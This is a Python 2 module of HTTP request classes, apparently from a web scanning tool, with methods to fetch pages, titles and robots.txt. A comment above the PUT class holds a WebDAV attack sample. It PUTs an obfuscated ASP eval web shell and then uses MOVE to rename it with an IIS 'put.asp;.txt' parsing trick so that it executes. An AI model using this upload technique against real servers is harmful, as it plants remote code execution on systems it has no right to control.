#!/usr/bin/python
#coding=utf-8

'''
it only has predictable results for tasks that involve a single socket operation.
An HTTP request consists of multiple socket operations
(e.g. DNS requests or other things that might be abstracted away from an HTTP client).
The timeout of the overall operation becomes unpredictable because of that.

It's because the HTTP spec does not provide anything for the client to specify time-to-live information with a HTTP request.
You can do this only on TCP level, as you mentioned.

On the other hand, the server may inform the client about timeout situations with HTTP status codes
408 Request Timeout resp.
504 Gateway Timeout.
'''


import socket
import httplib
import urllib2,urlparse
from lxml import html
from PackageHTTP.UserAgents import getRandomAgent
from PackageHTTP.Body import *

class HTTPMethod:
    def __init__(self):
        self.hostname=None
        self.port=None
        #HTTPConnection的四个参数
        self.method=None
        self.request_header={
            'User-Agent':getRandomAgent()
        }
        self.request_body=None
        self.path = '/'

    def setCookie(self, cookie):
        if cookie != None or len(cookie) != 0:
            self.request_header['Cookie'] = cookie

    def setHostInfo(self,url = None, hostname = None, port = 80):
        if url != None:
            # 0:schema
            # 1:hostname/ip
            # 2:path
            # 3:?
            # 4:querystring
            # 5:location
            u = urlparse.urlparse(url)
            host_info = u.netloc.split(':')
            self.hostname = host_info[0]
            if len(host_info) == 2:
                self.port = host_info[1]

            if len(u[2]) != 0:
                self.path = u[2]

            if len(u[4]) != 0:
                self.path += '?'
                self.path += u[4]

            if len(u[5]) != 0:
                self.path += '#'
                self.path += u[5]
        else:
            self.hostname = hostname
            self.port = port

    def getResponse(self):
        http_conn = httplib.HTTPConnection(self.hostname, self.port)
        response = {
            'status' : None,
            'headers' : None,
            'body' : None,
        }
        http_error = None
        try:
            if len(self.hostname) != 0 or self.hostname == None:
                http_conn.request(self.method, self.path, self.request_body, self.request_header)
                http_response = http_conn.getresponse()
                response['status'] = http_response.status
                response['headers'] = http_response.msg.dict
                response['body'] = http_response.read()

        # telnet 80
        # GET:Connection closed by foreign host.
        except httplib.BadStatusLine as e2:
            raise Exception('Connection closed by foreign host.')

        # 54 Connection reset by peer
        except Exception as e:
            error = e

        http_conn.close()
        return response, http_error

    # 2016-1-13
    #  请求只负责获取body内容,body部分的解析由reporter线程负责处理,
    #  尽可能快的使请求线程返回
    '''
    def handleResponse(self, raw_response):
        pass
    '''
class HTTPMethodGET(HTTPMethod):
    def __init__(self):
        HTTPMethod.__init__(self)
        self.method='GET'
        self.request_header['Accept-Encoding'] = 'gzip, deflate'
        self.responseBody = HTTPBodyResponse()

    '''
    def handleResponse(self, raw_response):
        try:
            header = raw_response.msg.dict
            body = raw_response.read()
            body = self.responseBody.decodeBody(header, body)

        except Exception as e:

        return body
    '''

'''
Content-Length
Content-Type
'''
class HTTPMethodPOST(HTTPMethod):
    def __init__(self,body):
        HTTPMethod.__init__(self)
        self.method='POST'
        self.request_body = body
        self.request_header['Content-Length'] = len(self.request_body)

    def handleResponse(self, raw_response):
        pass

'''
telnet 127.0.0.1 8080
PUT /put.txt HTTP/1.1
Content-Length: 92
Host: 127.0.0.1:8080

<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>

_______________________________________________________________________
MOVE /put.txt HTTP/1.1
Host: 127.0.0.1
Destination: http://127.0.0.1:8080/put.asp;.txt

测试地址(可以执行):
http://127.0.0.1:8080/put.asp;.txt
_______________________________________________________________________
'''
class HTTPMethodPUT(HTTPMethod):
    def __init__(self,body='generate by pyscript'):
        HTTPMethod.__init__(self)
        self.method='PUT'
        self.request_body = body
        self.request_header['Content-Length'] = len(self.request_body)

    '''
    def handleResponse(self, raw_response):
        pass
    '''


class HTTPMethodOPTIONS(HTTPMethod):
    def __init__(self):
        HTTPMethod.__init__(self)
        self.method='OPTIONS'

    '''
    def handleResponse(self, raw_response):
        pass
    '''


class HTTPMethodHEAD(HTTPMethod):
    def __init__(self):
        HTTPMethod.__init__(self)
        self.method='HEAD'

    '''
    def handleResponse(self, raw_response):
        pass
    '''


'''
    2016-1-13
        只请求Robots页面,具体的处理交由展示部分的Report线程

    2016-2-18
        请求robots.txt 返回非标准robots规范内容(fw页面,http服务器配死的页面)

    banner:
        server:iis  x-powered-by:waf/2.0    safedog
'''
class HTTPMethodGETRobots(HTTPMethodGET):
    def __init__(self):
        HTTPMethodGET.__init__(self)
        self.path='/robots.txt'

    def getResponse(self):
        resp, error = HTTPMethodGET.getResponse(self)
        if resp['status'] != 200:
            resp['body'] = ''
        elif 0 <= resp['body'].find('<html>'):
            resp['body']='Non-Standard Robots.txt'

        return resp, error

    '''
    def handleResponse(self, raw_response):
        pass
    '''

class HTTPMethodGETPage(HTTPMethodGET):
    def __init__(self):
        HTTPMethodGET.__init__(self)
        self.path='/'

    def getResponse(self):
        resp, error = HTTPMethodGET.getResponse(self)
        result = {
            'title':''
        }
        #if resp['status'] == 200:
        try:
            body = HTTPBodyResponse()
            unicode_body = body.decodeBody(resp['headers'], resp['body'])
            dom_body = html.fromstring(unicode_body)
            title = dom_body.xpath('//title')
            if len(title) > 0:
                title = title[0].text
                if title != None:
                    result['title'] = title.encode('utf-8')
                    result['title'] = result['title'].strip()
        #
        except Exception as e:
            error = 'parse title error'
        return result, error

if __name__ == '__main__':
    m = HTTPMethodGETPage()
    m.setHostInfo(url = 'http://127.0.0.1:80')
    resp, e = m.getResponse()

    print resp